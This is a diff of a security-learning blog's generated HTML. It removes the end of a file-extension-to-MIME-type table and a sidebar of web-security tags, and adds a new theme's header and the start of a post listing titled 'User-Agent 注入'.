-<td>text&#x2F;html</td>
-<td>.la1</td>
-<td>audio&#x2F;x-liquid-file</td>
-</tr>
-<tr>
-<td>.lar</td>
-<td>application&#x2F;x-laplayer-reg</td>
-<td>.latex</td>
-<td>application&#x2F;x-latex</td>
-</tr>
-<tr>
-<td>.lavs</td>
-<td>audio&#x2F;x-liquid-secure</td>
-<td>.lbm</td>
-<td>application&#x2F;x-lbm</td>
-</tr>
-<tr>
-<td>.lmsff</td>
-<td>audio&#x2F;x-la-lms</td>
-<td>.ls</td>
-<td>application&#x2F;x-javascript</td>
-</tr>
-<tr>
-<td>.ltr</td>
-<td>application&#x2F;x-ltr</td>
-<td>.m1v</td>
-<td>video&#x2F;x-mpeg</td>
-</tr>
-<tr>
-<td>.m2v</td>
-<td>video&#x2F;x-mpeg</td>
-<td>.m3u</td>
-<td>audio&#x2F;mpegurl</td>
-</tr>
-<tr>
-<td>.m4e</td>
-<td>video&#x2F;mpeg4</td>
-<td>.mac</td>
-<td>application&#x2F;x-mac</td>
-</tr>
-<tr>
-<td>.man</td>
-<td>application&#x2F;x-troff-man</td>
-<td>.math</td>
-<td>text&#x2F;xml</td>
-</tr>
-<tr>
-<td>.mdb</td>
-<td>application&#x2F;msaccess</td>
-<td>.mdb</td>
-<td>application&#x2F;x-mdb</td>
-</tr>
-<tr>
-<td>.mfp</td>
-<td>application&#x2F;x-shockwave-flash</td>
-<td>.mht</td>
-<td>message&#x2F;rfc822</td>
-</tr>
-<tr>
-<td>.mhtml</td>
-<td>message&#x2F;rfc822</td>
-<td>.mi</td>
-<td>application&#x2F;x-mi</td>
-</tr>
-<tr>
-<td>.mid</td>
-<td>audio&#x2F;mid</td>
-<td>.midi</td>
-<td>audio&#x2F;mid</td>
-</tr>
-<tr>
-<td>.mil</td>
-<td>application&#x2F;x-mil</td>
-<td>.mml</td>
-<td>text&#x2F;xml</td>
-</tr>
-<tr>
-<td>.mnd</td>
-<td>audio&#x2F;x-musicnet-download</td>
-<td>.mns</td>
-<td>audio&#x2F;x-musicnet-stream</td>
-</tr>
-<tr>
-<td>.mocha</td>
-<td>application&#x2F;x-javascript</td>
-<td>.movie</td>
-<td>video&#x2F;x-sgi-movie</td>
-</tr>
-<tr>
-<td>.mp1</td>
-<td>audio&#x2F;mp1</td>
-<td>.mp2</td>
-<td>audio&#x2F;mp2</td>
-</tr>
-<tr>
-<td>.mp2v</td>
-<td>video&#x2F;mpeg</td>
-<td>.mp3</td>
-<td>audio&#x2F;mp3</td>
-</tr>
-<tr>
-<td>.mp4</td>
-<td>video&#x2F;mpeg4</td>
-<td>.mpa</td>
-<td>video&#x2F;x-mpg</td>
-</tr>
-<tr>
-<td>.mpd</td>
-<td>application&#x2F;vnd.ms-project</td>
-<td>.mpe</td>
-<td>video&#x2F;x-mpeg</td>
-</tr>
-<tr>
-<td>.mpeg</td>
-<td>video&#x2F;mpg</td>
-<td>.mpg</td>
-<td>video&#x2F;mpg</td>
-</tr>
-<tr>
-<td>.mpga</td>
-<td>audio&#x2F;rn-mpeg</td>
-<td>.mpp</td>
-<td>application&#x2F;vnd.ms-project</td>
-</tr>
-<tr>
-<td>.mps</td>
-<td>video&#x2F;x-mpeg</td>
-<td>.mpt</td>
-<td>application&#x2F;vnd.ms-project</td>
-</tr>
-<tr>
-<td>.mpv</td>
-<td>video&#x2F;mpg</td>
-<td>.mpv2</td>
-<td>video&#x2F;mpeg</td>
-</tr>
-<tr>
-<td>.mpw</td>
-<td>application&#x2F;vnd.ms-project</td>
-<td>.mpx</td>
-<td>application&#x2F;vnd.ms-project</td>
-</tr>
-<tr>
-<td>.mtx</td>
-<td>text&#x2F;xml</td>
-<td>.mxp</td>
-<td>application&#x2F;x-mmxp</td>
-</tr>
-<tr>
-<td>.net</td>
-<td>image&#x2F;pnetvue</td>
-<td>.nrf</td>
-<td>application&#x2F;x-nrf</td>
-</tr>
-<tr>
-<td>.nws</td>
-<td>message&#x2F;rfc822</td>
-<td>.odc</td>
-<td>text&#x2F;x-ms-odc</td>
-</tr>
-<tr>
-<td>.out</td>
-<td>application&#x2F;x-out</td>
-<td>.p10</td>
-<td>application&#x2F;pkcs10</td>
-</tr>
-<tr>
-<td>.p12</td>
-<td>application&#x2F;x-pkcs12</td>
-<td>.p7b</td>
-<td>application&#x2F;x-pkcs7-certificates</td>
-</tr>
-<tr>
-<td>.p7c</td>
-<td>application&#x2F;pkcs7-mime</td>
-<td>.p7m</td>
-<td>application&#x2F;pkcs7-mime</td>
-</tr>
-<tr>
-<td>.p7r</td>
-<td>application&#x2F;x-pkcs7-certreqresp</td>
-<td>.p7s</td>
-<td>application&#x2F;pkcs7-signature</td>
-</tr>
-<tr>
-<td>.pc5</td>
-<td>application&#x2F;x-pc5</td>
-<td>.pci</td>
-<td>application&#x2F;x-pci</td>
-</tr>
-<tr>
-<td>.pcl</td>
-<td>application&#x2F;x-pcl</td>
-<td>.pcx</td>
-<td>application&#x2F;x-pcx</td>
-</tr>
-<tr>
-<td>.pdf</td>
-<td>application&#x2F;pdf</td>
-<td>.pdf</td>
-<td>application&#x2F;pdf</td>
-</tr>
-<tr>
-<td>.pdx</td>
-<td>application&#x2F;vnd.adobe.pdx</td>
-<td>.pfx</td>
-<td>application&#x2F;x-pkcs12</td>
-</tr>
-<tr>
-<td>.pgl</td>
-<td>application&#x2F;x-pgl</td>
-<td>.pic</td>
-<td>application&#x2F;x-pic</td>
-</tr>
-<tr>
-<td>.pko</td>
-<td>application&#x2F;vnd.ms-pki.pko</td>
-<td>.pl</td>
-<td>application&#x2F;x-perl</td>
-</tr>
-<tr>
-<td>.plg</td>
-<td>text&#x2F;html</td>
-<td>.pls</td>
-<td>audio&#x2F;scpls</td>
-</tr>
-<tr>
-<td>.plt</td>
-<td>application&#x2F;x-plt</td>
-<td>.png</td>
-<td>image&#x2F;png</td>
-</tr>
-<tr>
-<td>.png</td>
-<td>application&#x2F;x-png</td>
-<td>.pot</td>
-<td>application&#x2F;vnd.ms-powerpoint</td>
-</tr>
-<tr>
-<td>.ppa</td>
-<td>application&#x2F;vnd.ms-powerpoint</td>
-<td>.ppm</td>
-<td>application&#x2F;x-ppm</td>
-</tr>
-<tr>
-<td>.pps</td>
-<td>application&#x2F;vnd.ms-powerpoint</td>
-<td>.ppt</td>
-<td>application&#x2F;vnd.ms-powerpoint</td>
-</tr>
-<tr>
-<td>.ppt</td>
-<td>application&#x2F;x-ppt</td>
-<td>.pr</td>
-<td>application&#x2F;x-pr</td>
-</tr>
-<tr>
-<td>.prf</td>
-<td>application&#x2F;pics-rules</td>
-<td>.prn</td>
-<td>application&#x2F;x-prn</td>
-</tr>
-<tr>
-<td>.prt</td>
-<td>application&#x2F;x-prt</td>
-<td>.ps</td>
-<td>application&#x2F;x-ps</td>
-</tr>
-<tr>
-<td>.ps</td>
-<td>application&#x2F;postscript</td>
-<td>.ptn</td>
-<td>application&#x2F;x-ptn</td>
-</tr>
-<tr>
-<td>.pwz</td>
-<td>application&#x2F;vnd.ms-powerpoint</td>
-<td>.r3t</td>
-<td>text&#x2F;vnd.rn-realtext3d</td>
-</tr>
-<tr>
-<td>.ra</td>
-<td>audio&#x2F;vnd.rn-realaudio</td>
-<td>.ram</td>
-<td>audio&#x2F;x-pn-realaudio</td>
-</tr>
-<tr>
-<td>.ras</td>
-<td>application&#x2F;x-ras</td>
-<td>.rat</td>
-<td>application&#x2F;rat-file</td>
-</tr>
-<tr>
-<td>.rdf</td>
-<td>text&#x2F;xml</td>
-<td>.rec</td>
-<td>application&#x2F;vnd.rn-recording</td>
-</tr>
-<tr>
-<td>.red</td>
-<td>application&#x2F;x-red</td>
-<td>.rgb</td>
-<td>application&#x2F;x-rgb</td>
-</tr>
-<tr>
-<td>.rjs</td>
-<td>application&#x2F;vnd.rn-realsystem-rjs</td>
-<td>.rjt</td>
-<td>application&#x2F;vnd.rn-realsystem-rjt</td>
-</tr>
-<tr>
-<td>.rlc</td>
-<td>application&#x2F;x-rlc</td>
-<td>.rle</td>
-<td>application&#x2F;x-rle</td>
-</tr>
-<tr>
-<td>.rm</td>
-<td>application&#x2F;vnd.rn-realmedia</td>
-<td>.rmf</td>
-<td>application&#x2F;vnd.adobe.rmf</td>
-</tr>
-<tr>
-<td>.rmi</td>
-<td>audio&#x2F;mid</td>
-<td>.rmj</td>
-<td>application&#x2F;vnd.rn-realsystem-rmj</td>
-</tr>
-<tr>
-<td>.rmm</td>
-<td>audio&#x2F;x-pn-realaudio</td>
-<td>.rmp</td>
-<td>application&#x2F;vnd.rn-rn_music_package</td>
-</tr>
-<tr>
-<td>.rms</td>
-<td>application&#x2F;vnd.rn-realmedia-secure</td>
-<td>.rmvb</td>
-<td>application&#x2F;vnd.rn-realmedia-vbr</td>
-</tr>
-<tr>
-<td>.rmx</td>
-<td>application&#x2F;vnd.rn-realsystem-rmx</td>
-<td>.rnx</td>
-<td>application&#x2F;vnd.rn-realplayer</td>
-</tr>
-<tr>
-<td>.rp</td>
-<td>image&#x2F;vnd.rn-realpix</td>
-<td>.rpm</td>
-<td>audio&#x2F;x-pn-realaudio-plugin</td>
-</tr>
-<tr>
-<td>.rsml</td>
-<td>application&#x2F;vnd.rn-rsml</td>
-<td>.rt</td>
-<td>text&#x2F;vnd.rn-realtext</td>
-</tr>
-<tr>
-<td>.rtf</td>
-<td>application&#x2F;msword</td>
-<td>.rtf</td>
-<td>application&#x2F;x-rtf</td>
-</tr>
-<tr>
-<td>.rv</td>
-<td>video&#x2F;vnd.rn-realvideo</td>
-<td>.sam</td>
-<td>application&#x2F;x-sam</td>
-</tr>
-<tr>
-<td>.sat</td>
-<td>application&#x2F;x-sat</td>
-<td>.sdp</td>
-<td>application&#x2F;sdp</td>
-</tr>
-<tr>
-<td>.sdw</td>
-<td>application&#x2F;x-sdw</td>
-<td>.sit</td>
-<td>application&#x2F;x-stuffit</td>
-</tr>
-<tr>
-<td>.slb</td>
-<td>application&#x2F;x-slb</td>
-<td>.sld</td>
-<td>application&#x2F;x-sld</td>
-</tr>
-<tr>
-<td>.slk</td>
-<td>drawing&#x2F;x-slk</td>
-<td>.smi</td>
-<td>application&#x2F;smil</td>
-</tr>
-<tr>
-<td>.smil</td>
-<td>application&#x2F;smil</td>
-<td>.smk</td>
-<td>application&#x2F;x-smk</td>
-</tr>
-<tr>
-<td>.snd</td>
-<td>audio&#x2F;basic</td>
-<td>.sol</td>
-<td>text&#x2F;plain</td>
-</tr>
-<tr>
-<td>.sor</td>
-<td>text&#x2F;plain</td>
-<td>.spc</td>
-<td>application&#x2F;x-pkcs7-certificates</td>
-</tr>
-<tr>
-<td>.spl</td>
-<td>application&#x2F;futuresplash</td>
-<td>.spp</td>
-<td>text&#x2F;xml</td>
-</tr>
-<tr>
-<td>.ssm</td>
-<td>application&#x2F;streamingmedia</td>
-<td>.sst</td>
-<td>application&#x2F;vnd.ms-pki.certstore</td>
-</tr>
-<tr>
-<td>.stl</td>
-<td>application&#x2F;vnd.ms-pki.stl</td>
-<td>.stm</td>
-<td>text&#x2F;html</td>
-</tr>
-<tr>
-<td>.sty</td>
-<td>application&#x2F;x-sty</td>
-<td>.svg</td>
-<td>text&#x2F;xml</td>
-</tr>
-<tr>
-<td>.swf</td>
-<td>application&#x2F;x-shockwave-flash</td>
-<td>.tdf</td>
-<td>application&#x2F;x-tdf</td>
-</tr>
-<tr>
-<td>.tg4</td>
-<td>application&#x2F;x-tg4</td>
-<td>.tga</td>
-<td>application&#x2F;x-tga</td>
-</tr>
-<tr>
-<td>.tif</td>
-<td>image&#x2F;tiff</td>
-<td>.tif</td>
-<td>application&#x2F;x-tif</td>
-</tr>
-<tr>
-<td>.tiff</td>
-<td>image&#x2F;tiff</td>
-<td>.tld</td>
-<td>text&#x2F;xml</td>
-</tr>
-<tr>
-<td>.top</td>
-<td>drawing&#x2F;x-top</td>
-<td>.torrent</td>
-<td>application&#x2F;x-bittorrent</td>
-</tr>
-<tr>
-<td>.tsd</td>
-<td>text&#x2F;xml</td>
-<td>.txt</td>
-<td>text&#x2F;plain</td>
-</tr>
-<tr>
-<td>.uin</td>
-<td>application&#x2F;x-icq</td>
-<td>.uls</td>
-<td>text&#x2F;iuls</td>
-</tr>
-<tr>
-<td>.vcf</td>
-<td>text&#x2F;x-vcard</td>
-<td>.vda</td>
-<td>application&#x2F;x-vda</td>
-</tr>
-<tr>
-<td>.vdx</td>
-<td>application&#x2F;vnd.visio</td>
-<td>.vml</td>
-<td>text&#x2F;xml</td>
-</tr>
-<tr>
-<td>.vpg</td>
-<td>application&#x2F;x-vpeg005</td>
-<td>.vsd</td>
-<td>application&#x2F;vnd.visio</td>
-</tr>
-<tr>
-<td>.vsd</td>
-<td>application&#x2F;x-vsd</td>
-<td>.vss</td>
-<td>application&#x2F;vnd.visio</td>
-</tr>
-<tr>
-<td>.vst</td>
-<td>application&#x2F;vnd.visio</td>
-<td>.vst</td>
-<td>application&#x2F;x-vst</td>
-</tr>
-<tr>
-<td>.vsw</td>
-<td>application&#x2F;vnd.visio</td>
-<td>.vsx</td>
-<td>application&#x2F;vnd.visio</td>
-</tr>
-<tr>
-<td>.vtx</td>
-<td>application&#x2F;vnd.visio</td>
-<td>.vxml</td>
-<td>text&#x2F;xml</td>
-</tr>
-<tr>
-<td>.wav</td>
-<td>audio&#x2F;wav</td>
-<td>.wax</td>
-<td>audio&#x2F;x-ms-wax</td>
-</tr>
-<tr>
-<td>.wb1</td>
-<td>application&#x2F;x-wb1</td>
-<td>.wb2</td>
-<td>application&#x2F;x-wb2</td>
-</tr>
-<tr>
-<td>.wb3</td>
-<td>application&#x2F;x-wb3</td>
-<td>.wbmp</td>
-<td>image&#x2F;vnd.wap.wbmp</td>
-</tr>
-<tr>
-<td>.wiz</td>
-<td>application&#x2F;msword</td>
-<td>.wk3</td>
-<td>application&#x2F;x-wk3</td>
-</tr>
-<tr>
-<td>.wk4</td>
-<td>application&#x2F;x-wk4</td>
-<td>.wkq</td>
-<td>application&#x2F;x-wkq</td>
-</tr>
-<tr>
-<td>.wks</td>
-<td>application&#x2F;x-wks</td>
-<td>.wm</td>
-<td>video&#x2F;x-ms-wm</td>
-</tr>
-<tr>
-<td>.wma</td>
-<td>audio&#x2F;x-ms-wma</td>
-<td>.wmd</td>
-<td>application&#x2F;x-ms-wmd</td>
-</tr>
-<tr>
-<td>.wmf</td>
-<td>application&#x2F;x-wmf</td>
-<td>.wml</td>
-<td>text&#x2F;vnd.wap.wml</td>
-</tr>
-<tr>
-<td>.wmv</td>
-<td>video&#x2F;x-ms-wmv</td>
-<td>.wmx</td>
-<td>video&#x2F;x-ms-wmx</td>
-</tr>
-<tr>
-<td>.wmz</td>
-<td>application&#x2F;x-ms-wmz</td>
-<td>.wp6</td>
-<td>application&#x2F;x-wp6</td>
-</tr>
-<tr>
-<td>.wpd</td>
-<td>application&#x2F;x-wpd</td>
-<td>.wpg</td>
-<td>application&#x2F;x-wpg</td>
-</tr>
-<tr>
-<td>.wpl</td>
-<td>application&#x2F;vnd.ms-wpl</td>
-<td>.wq1</td>
-<td>application&#x2F;x-wq1</td>
-</tr>
-<tr>
-<td>.wr1</td>
-<td>application&#x2F;x-wr1</td>
-<td>.wri</td>
-<td>application&#x2F;x-wri</td>
-</tr>
-<tr>
-<td>.wrk</td>
-<td>application&#x2F;x-wrk</td>
-<td>.ws</td>
-<td>application&#x2F;x-ws</td>
-</tr>
-<tr>
-<td>.ws2</td>
-<td>application&#x2F;x-ws</td>
-<td>.wsc</td>
-<td>text&#x2F;scriptlet</td>
-</tr>
-<tr>
-<td>.wsdl</td>
-<td>text&#x2F;xml</td>
-<td>.wvx</td>
-<td>video&#x2F;x-ms-wvx</td>
-</tr>
-<tr>
-<td>.xdp</td>
-<td>application&#x2F;vnd.adobe.xdp</td>
-<td>.xdr</td>
-<td>text&#x2F;xml</td>
-</tr>
-<tr>
-<td>.xfd</td>
-<td>application&#x2F;vnd.adobe.xfd</td>
-<td>.xfdf</td>
-<td>application&#x2F;vnd.adobe.xfdf</td>
-</tr>
-<tr>
-<td>.xhtml</td>
-<td>text&#x2F;html</td>
-<td>.xls</td>
-<td>application&#x2F;vnd.ms-excel</td>
-</tr>
-<tr>
-<td>.xls</td>
-<td>application&#x2F;x-xls</td>
-<td>.xlw</td>
-<td>application&#x2F;x-xlw</td>
-</tr>
-<tr>
-<td>.xml</td>
-<td>text&#x2F;xml</td>
-<td>.xpl</td>
-<td>audio&#x2F;scpls</td>
-</tr>
-<tr>
-<td>.xq</td>
-<td>text&#x2F;xml</td>
-<td>.xql</td>
-<td>text&#x2F;xml</td>
-</tr>
-<tr>
-<td>.xquery</td>
-<td>text&#x2F;xml</td>
-<td>.xsd</td>
-<td>text&#x2F;xml</td>
-</tr>
-<tr>
-<td>.xsl</td>
-<td>text&#x2F;xml</td>
-<td>.xslt</td>
-<td>text&#x2F;xml</td>
-</tr>
-<tr>
-<td>.xwd</td>
-<td>application&#x2F;x-xwd</td>
-<td>.x_b</td>
-<td>application&#x2F;x-x_b</td>
-</tr>
-<tr>
-<td>.sis</td>
-<td>application&#x2F;vnd.symbian.install</td>
-<td>.sisx</td>
-<td>application&#x2F;vnd.symbian.install</td>
-</tr>
-<tr>
-<td>.x_t</td>
-<td>application&#x2F;x-x_t</td>
-<td>.ipa</td>
-<td>application&#x2F;vnd.iphone</td>
-</tr>
-<tr>
-<td>.apk</td>
-<td>application&#x2F;vnd.android.package-archive</td>
-<td>.xap</td>
-<td>application&#x2F;x-silverlight-app</td>
-</tr>
-</tbody></table>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/05/20/Web/HTTP%E6%95%99%E7%A8%8B/HTTP%20content-type/" data-id="cmaxygi0r0010oc7kh1666060" data-title="HTTP Content-Type详解" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Content-Type/" rel="tag">Content-Type</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HTTP/" rel="tag">HTTP</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-
-
-  <nav id="page-nav">
-    
-    <a class="extend prev" rel="prev" href="/page/8/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="page-number" href="/page/8/">8</a><span class="page-number current">9</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/10/">Next &raquo;</a>
-  </nav>
-
-</section>
-        
-          <aside id="sidebar">
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Categories</h3>
-    <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Web/">Web</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Web/HTTP%E6%95%99%E7%A8%8B/">HTTP教程</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/PHP%E5%AE%89%E5%85%A8/">PHP安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/XSS/">XSS</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">工具使用</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">注入漏洞</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a></li></ul></li></ul></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tags</h3>
-    <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSRF/" rel="tag">CSRF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF%E9%A2%98%E7%9B%AE/" rel="tag">CTF题目</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Content-Type/" rel="tag">Content-Type</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTP/" rel="tag">HTTP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTPS/" rel="tag">HTTPS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSTI/" rel="tag">SSTI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/" rel="tag">XSS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSStrike/" rel="tag">XSStrike</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/labs/" rel="tag">labs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%9E%E6%88%98/" rel="tag">实战</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/" rel="tag">对象注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" rel="tag">报错注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" rel="tag">数据库</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" rel="tag">模板注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/" rel="tag">比较漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" rel="tag">网络协议</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag">网络安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/" rel="tag">跨站脚本</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tag Cloud</h3>
-    <div class="widget tagcloud">
-      <a href="/tags/CSRF/" style="font-size: 10px;">CSRF</a> <a href="/tags/CTF%E9%A2%98%E7%9B%AE/" style="font-size: 10px;">CTF题目</a> <a href="/tags/Content-Type/" style="font-size: 10px;">Content-Type</a> <a href="/tags/HTTP/" style="font-size: 13.33px;">HTTP</a> <a href="/tags/HTTPS/" style="font-size: 10px;">HTTPS</a> <a href="/tags/PHP/" style="font-size: 16.67px;">PHP</a> <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 13.33px;">SQL注入</a> <a href="/tags/SSTI/" style="font-size: 10px;">SSTI</a> <a href="/tags/XSS/" style="font-size: 20px;">XSS</a> <a href="/tags/XSStrike/" style="font-size: 10px;">XSStrike</a> <a href="/tags/labs/" style="font-size: 10px;">labs</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 13.33px;">反序列化</a> <a href="/tags/%E5%AE%89%E5%85%A8/" style="font-size: 13.33px;">安全</a> <a href="/tags/%E5%AE%9E%E6%88%98/" style="font-size: 10px;">实战</a> <a href="/tags/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">对象注入</a> <a href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">报错注入</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 10px;">数据库</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">比较漏洞</a> <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 10px;">渗透测试</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" style="font-size: 10px;">网络协议</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="font-size: 10px;">网络安全</a> <a href="/tags/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/" style="font-size: 10px;">跨站脚本</a>
-    </div>
-  </div>
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/05/">May 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/05/">May 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/04/">April 2024</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/xsstrike/">(no title)</a>
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
           </li>
+          
         
-          <li>
-            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/">(no title)</a>
-          </li>
         
-          <li>
-            <a href="/2025/05/20/Web/%E7%BB%95%E8%BF%87/%E7%BB%95%E8%BF%87/">(no title)</a>
-          </li>
-        
-          <li>
-            <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E+%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/">(no title)</a>
-          </li>
-        
-          <li>
-            <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/user.ini/">(no title)</a>
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
           </li>
         
       </ul>
     </div>
   </div>
+</nav>
 
   
-</aside>
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Welcome to My Blog"></span>
+          
+        </div>
+
         
       </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
+
       
-      &copy; 2025 John Doe<br>
-      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
     </div>
   </div>
-</footer>
+</div>
 
-    </div>
-    <nav id="mobile-nav">
+</div>
+
+  </header>
+
+  <main>
+    
+      <div class="container nopadding-x-md">
+        <div id="board"
+          style="margin-top: 0">
+          
+          <div class="container">
+            <div class="row">
+              <div class="col-12 col-md-10 m-auto">
+                
+
+
+  <div class="row mx-auto index-card">
+    
+    
+      <div class="col-12 col-md-4 m-auto index-img">
+        <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/User-Agent%20%E6%B3%A8%E5%85%A5/" target="_self">
+          <img src="/image/default.png" srcset="/image/loading.gif" lazyload alt="User-Agent 注入">
+        </a>
+      </div>
+    
+    <article class="col-12 col-md-8 mx-auto index-info">
+      <h2 class="index-header">
+        
+        <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/User-Agent%20%E6%B3%A8%E5%85%A5/" target="_self">
+          User-Agent 注入
+        </a>
+      </h2>
+
+      
